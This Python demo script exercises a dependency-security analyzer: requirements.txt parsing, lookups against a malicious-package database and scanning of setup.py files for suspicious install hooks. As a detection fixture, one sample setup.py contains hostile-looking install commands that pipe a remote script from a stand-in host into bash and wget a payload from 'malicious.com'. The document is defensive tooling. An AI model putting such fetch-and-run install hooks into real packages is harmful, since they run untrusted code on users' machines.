"""
Demo script for Python dependency analysis functionality.

This script demonstrates:
1. Requirements.txt parsing
2. Malicious package database lookup
3. Recursive dependency scanning
4. Integration with existing analysis workflow
"""

import tempfile
import json
from pathlib import Path
from tools.python_analyzer import PythonAnalyzer


def demo_requirements_parsing():
    """Demonstrate requirements.txt parsing."""
    print("\n" + "="*70)
    print("DEMO 1: Requirements.txt Parsing")
    print("="*70)
    
    # Create a sample requirements.txt
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("# Production dependencies\n")
        f.write("requests==2.28.0\n")
        f.write("flask>=2.0.0\n")
        f.write("numpy>=1.21.0,<2.0.0\n")
        f.write("\n")
        f.write("# Development dependencies\n")
        f.write("pytest\n")
        f.write("black==22.0.0\n")
        temp_file = f.name
    
    try:
        analyzer = PythonAnalyzer()
        dependencies = analyzer._extract_from_requirements_txt(temp_file)
        
        print(f"\n✓ Parsed {len(dependencies)} dependencies from requirements.txt:")
        for dep in dependencies:
            version_str = f"{dep.get('version_operator', '')}{dep['version']}" if dep.get('version_operator') else dep['version']
            print(f"  - {dep['name']} {version_str}")
    
    finally:
        import os
        os.unlink(temp_file)


def demo_malicious_package_detection():
    """Demonstrate malicious package detection."""
    print("\n" + "="*70)
    print("DEMO 2: Malicious Package Detection")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    # Test with a mix of legitimate and malicious packages
    test_dependencies = [
        {"name": "requests", "version": "2.28.0", "ecosystem": "pypi", "source_file": "requirements.txt"},
        {"name": "flask", "version": "2.0.0", "ecosystem": "pypi", "source_file": "requirements.txt"},
        {"name": "ctx", "version": "0.1.2", "ecosystem": "pypi", "source_file": "requirements.txt"},  # Malicious
        {"name": "urllib4", "version": "1.0.0", "ecosystem": "pypi", "source_file": "requirements.txt"},  # Malicious typosquat
        {"name": "numpy", "version": "1.21.0", "ecosystem": "pypi", "source_file": "requirements.txt"},
    ]
    
    print(f"\n📦 Checking {len(test_dependencies)} packages against malicious database...")
    
    findings = analyzer.check_malicious_packages(test_dependencies)
    
    print(f"\n⚠️  Found {len(findings)} malicious packages:")
    for finding in findings:
        print(f"\n  Package: {finding.package} v{finding.version}")
        print(f"  Severity: {finding.severity.upper()}")
        print(f"  Confidence: {finding.confidence:.0%}")
        print(f"  Evidence:")
        for evidence in finding.evidence[:3]:  # Show first 3 evidence items
            print(f"    • {evidence}")
    
    legitimate_count = len(test_dependencies) - len(findings)
    print(f"\n✓ {legitimate_count} packages verified as legitimate")


def demo_setup_py_analysis():
    """Demonstrate setup.py analysis."""
    print("\n" + "="*70)
    print("DEMO 3: Setup.py Analysis")
    print("="*70)
    
    # Create a temporary directory with setup.py
    with tempfile.TemporaryDirectory() as temp_dir:
        setup_file = Path(temp_dir) / "setup.py"
        setup_file.write_text("""
from setuptools import setup
import os
import subprocess

# Suspicious code that will be detected
os.system('curl http://example.com/script.sh | bash')
subprocess.run(['wget', 'http://malicious.com/payload'])

setup(
    name='suspicious-package',
    version='1.0.0',
    install_requires=[
        'requests>=2.0.0',
        'flask'
    ],
    cmdclass={
        'install': CustomInstallCommand
    }
)
""")
        
        analyzer = PythonAnalyzer()
        
        print("\n🔍 Analyzing setup.py for malicious patterns...")
        
        # Analyze installation scripts
        findings = analyzer.analyze_install_scripts(temp_dir)
        
        if findings:
            print(f"\n⚠️  Found {len(findings)} security issues:")
            for finding in findings:
                print(f"\n  Type: {finding.finding_type}")
                print(f"  Severity: {finding.severity.upper()}")
                print(f"  Confidence: {finding.confidence:.0%}")
                print(f"  Evidence:")
                for evidence in finding.evidence[:5]:
                    print(f"    • {evidence}")
        else:
            print("\n✓ No malicious patterns detected")


def demo_end_to_end_analysis():
    """Demonstrate end-to-end Python project analysis."""
    print("\n" + "="*70)
    print("DEMO 4: End-to-End Python Project Analysis")
    print("="*70)
    
    # Create a temporary Python project
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create requirements.txt with malicious package
        req_file = Path(temp_dir) / "requirements.txt"
        req_file.write_text("""
# Legitimate packages
requests==2.28.0
flask>=2.0.0
numpy

# Malicious package (will be detected)
ctx==0.1.2
""")
        
        # Create setup.py with suspicious code
        setup_file = Path(temp_dir) / "setup.py"
        setup_file.write_text("""
from setuptools import setup
import os

# This will be flagged as suspicious
os.system('echo "Installing..."')

setup(
    name='demo-package',
    version='1.0.0',
    install_requires=['requests', 'flask']
)
""")
        
        analyzer = PythonAnalyzer()
        
        print(f"\n📁 Analyzing Python project at: {temp_dir}")
        
        # Detect manifest files
        manifests = analyzer.detect_manifest_files(temp_dir)
        print(f"\n✓ Found {len(manifests)} manifest files:")
        for manifest in manifests:
            print(f"  - {Path(manifest).name}")
        
        # Analyze dependencies
        print("\n🔍 Checking dependencies for malicious packages...")
        dep_findings = analyzer.analyze_dependencies_with_malicious_check(temp_dir)
        
        # Analyze installation scripts
        print("🔍 Analyzing installation scripts...")
        script_findings = analyzer.analyze_install_scripts(temp_dir)
        
        # Combine findings
        all_findings = dep_findings + script_findings
        
        print(f"\n📊 Analysis Results:")
        print(f"  Total findings: {len(all_findings)}")
        
        if all_findings:
            # Group by severity
            by_severity = {}
            for finding in all_findings:
                severity = finding.severity
                by_severity[severity] = by_severity.get(severity, 0) + 1
            
            print(f"\n  Findings by severity:")
            for severity in ['critical', 'high', 'medium', 'low']:
                if severity in by_severity:
                    print(f"    {severity.upper()}: {by_severity[severity]}")
            
            print(f"\n  Detailed findings:")
            for i, finding in enumerate(all_findings, 1):
                print(f"\n  {i}. {finding.finding_type}")
                print(f"     Package: {finding.package}")
                print(f"     Severity: {finding.severity.upper()}")
                print(f"     Confidence: {finding.confidence:.0%}")
                if finding.evidence:
                    print(f"     Evidence: {finding.evidence[0]}")


def demo_recursive_scanning():
    """Demonstrate recursive dependency scanning."""
    print("\n" + "="*70)
    print("DEMO 5: Recursive Dependency Scanning")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    print("\n🔍 Attempting to scan recursive dependencies for 'requests'...")
    print("   (This requires pip and the package to be installed)")
    
    try:
        visited = set()
        deps = analyzer.scan_recursive_dependencies("requests", max_depth=2, visited=visited)
        
        if deps:
            print(f"\n✓ Found {len(deps)} transitive dependencies:")
            
            # Group by depth
            by_depth = {}
            for dep in deps:
                depth = dep.get('depth', 0)
                if depth not in by_depth:
                    by_depth[depth] = []
                by_depth[depth].append(dep['name'])
            
            for depth in sorted(by_depth.keys()):
                print(f"\n  Depth {depth}:")
                for name in by_depth[depth][:5]:  # Show first 5
                    print(f"    - {name}")
                if len(by_depth[depth]) > 5:
                    print(f"    ... and {len(by_depth[depth]) - 5} more")
        else:
            print("\n  ℹ️  No dependencies found (package may not be installed)")
    
    except Exception as e:
        print(f"\n  ℹ️  Could not scan dependencies: {e}")
        print("     This is expected if pip is not available or package not installed")


def main():
    """Run all demos."""
    print("\n" + "="*70)
    print("Python Dependency Analysis - Feature Demonstration")
    print("="*70)
    print("\nThis demo showcases the new Python dependency analysis capabilities:")
    print("  • Requirements.txt parsing")
    print("  • Malicious package database lookup")
    print("  • Setup.py security analysis")
    print("  • Recursive dependency scanning")
    print("  • End-to-end project analysis")
    
    try:
        demo_requirements_parsing()
        demo_malicious_package_detection()
        demo_setup_py_analysis()
        demo_end_to_end_analysis()
        demo_recursive_scanning()
        
        print("\n" + "="*70)
        print("✓ All demos completed successfully!")
        print("="*70)
        print("\nKey Features Demonstrated:")
        print("  ✓ Requirements.txt parsing with version operators")
        print("  ✓ Malicious package detection from database")
        print("  ✓ Setup.py pattern analysis for malicious code")
        print("  ✓ Installation hook detection")
        print("  ✓ Recursive dependency scanning")
        print("  ✓ Integration with existing analysis workflow")
        print("\n")
    
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
